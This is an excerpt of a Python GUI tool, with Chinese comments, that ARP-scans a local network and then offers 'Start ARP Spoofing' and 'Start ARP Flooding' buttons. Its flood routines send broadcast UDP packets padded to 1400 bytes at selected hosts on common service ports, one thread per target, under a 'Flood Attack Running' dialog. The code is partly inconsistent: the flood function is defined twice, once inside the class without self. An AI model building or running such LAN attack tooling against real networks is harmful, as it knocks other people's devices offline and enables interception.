...
import ipaddress
import netifaces
from scapy.all import Ether, ARP, srp, sendp, IP, UDP
...
class NetworkScanner(QThread):
    ...
    def __init__(self, scanned_devices):
        ...
        self.device_list = []  # 存储所有的设备信息
        self.result_queue = Queue()  # 用于存储结果的队列
    ...
    def run(self):
        try:
            ...
            own_ip = self.get_own_ip(gateway_ip)  # 获取本机在局域网中的IP地址
            query = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=network)

            # 启动显示线程
            display_thread = Thread(target=self.display_results)
            ...
            for _, received in srp(query, timeout=2, verbose=0)[0]:
                ...
                # 跳过网关IP、本机IP以及已扫描的设备
                if ip not in self.scanned_devices and ip != gateway_ip and ip != own_ip:
                    self.scanned_devices.add(ip)
                    self.device_list.append((ip, mac))

            if not self.device_list:
                self.update_status.emit("No devices found.")
            else:
                self.update_status.emit("Resolving manufacturers...")

                # 根据设备数量确定线程数
                num_threads = min(len(self.device_list), 50)

                # 使用线程池并行获取制造商信息
                with ThreadPoolExecutor(max_workers=num_threads) as executor:
                    for result in executor.map(self.get_manufacturer_parallel, self.device_list):
                        self.result_queue.put(result)  # 将结果放入队列
            ...
            # 等待显示线程完成
            self.result_queue.put(None)  # 向队列发送结束信号
            display_thread.join()

        except Exception as e:
            self.error_occurred.emit(f"Failed to scan network: {str(e)}")

    def get_own_ip(self, gateway_ip):
        # 获取本机在特定局域网中的IP地址
                ...
                for addr in addresses[netifaces.AF_INET]:
                    ...
                    if netmask:
                        ...
                        if ipaddress.IPv4Address(gateway_ip) in network:
                            return ip
        raise Exception("Could not determine the local IP address in the network.")

    def get_manufacturer_parallel(self, device):
        ip, mac = device
        manufacturer = get_manufacturer(mac)
        return ip, mac, manufacturer
    ...
    def display_results(self):
        ...
        # 按照IP地址排序
        results.sort(key=lambda x: int(ipaddress.IPv4Address(x[0])))

        # 逐一显示结果
        for ip, mac, manufacturer in results:
            self.found_device.emit(ip, mac, manufacturer)  # 发送单独的参数
            time.sleep(0.01)  # 每 0.01 秒显示一个设备
...
class NetworkToolGUI(QWidget):
    ...
    def initUI(self):
        ...
        self.attack_button = QPushButton("Start ARP Spoofing", self)
        ...
        self.flood_button = QPushButton("Start ARP Flooding", self)
        self.flood_button.setEnabled(False)
        self.flood_button.clicked.connect(self.start_flood_attack)
        layout.addWidget(self.flood_button)
    ...
    def toggle_language(self, value):
        ...
        if value == 0:
            ...
            self.attack_button.setText("Start ARP Spoofing")
            self.flood_button.setText("Start ARP Flooding")
        else:
            self.language = "简体中文"
            ...
            self.attack_button.setText("开始ARP欺骗")
            self.flood_button.setText("开始ARP泛洪")
    ...
    def update_attack_button(self):
        ...
        self.flood_button.setEnabled(has_valid_packet_input and has_targets_selected)
    ...
    def start_flood_attack(self):
        ...
        # Use a dialog to indicate the attack is ongoing
        self.attack_dialog = QProgressDialog(self)
        self.attack_dialog.setWindowTitle("Flood Attack Running")
        self.attack_dialog.setLabelText("Sending Flood packets...")
        self.attack_dialog.setCancelButtonText("Stop Attack")
        self.attack_dialog.setRange(0, 0)
        self.attack_dialog.setWindowModality(Qt.ApplicationModal)
        self.attack_dialog.setMinimumWidth(300)
        ...
        self.stop_attack_event.clear()
        self.attack_threads = [
            threading.Thread(target=self.run_flood_attack, args=(target, packets_per_sec))
            for target in selected_targets
        ]
    ...
    def run_flood_attack(self, target, pkt_per_sec):
        try:
            target_ip, target_mac = target
            send_flood_packet(target_ip, pkt_per_sec)
        except Exception as e:
            self.on_attack_error(str(e))

    def send_flood_packet(target_ip, count):
        # 设置目标端口列表
        ports = [80, 443, 53, 22, 8080]
        
        # 创建一个大小为1400字节的payload
        payload = "X" * (1400 - 42)  # 42字节是Ether/IP/UDP头部的大小，因此减去42字节
        
        # 发送数据包到每个端口
        for port in ports:
            packet = Ether(dst="ff:ff:ff:ff:ff:ff") / IP(dst=target_ip) / UDP(dport=port) / payload
...
def send_flood_packet(target_ip, count):
    packet = Ether(dst="ff:ff:ff:ff:ff:ff") / IP(dst=target_ip) / UDP(dport=80)
    sendp(packet, count=count, inter=1.0/count, verbose=False)
